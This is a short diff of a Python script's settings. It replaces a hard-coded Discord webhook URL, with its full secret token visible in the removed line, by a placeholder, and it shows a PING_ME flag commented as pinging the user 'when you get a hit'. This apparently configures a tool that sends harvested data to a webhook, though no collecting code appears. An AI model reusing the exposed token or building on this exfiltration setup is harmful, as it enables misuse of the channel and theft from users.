@@ -5,7 +5,7 @@ import json
 from urllib.request import Request, urlopen
 
 # your webhook URL
-WEBHOOK_URL = 'https://discord.com/api/webhooks/773614388526579742/O8bvKLXvtePcQRSqWRyCVvy-oqRpd_0gfW08EtVMZ3qHGOgfK3MKbDGtN2y1sEsTmrLr'
+WEBHOOK_URL = 'WEBHOOK URL HERE'
 
 # mentions you when you get a hit
 PING_ME = False
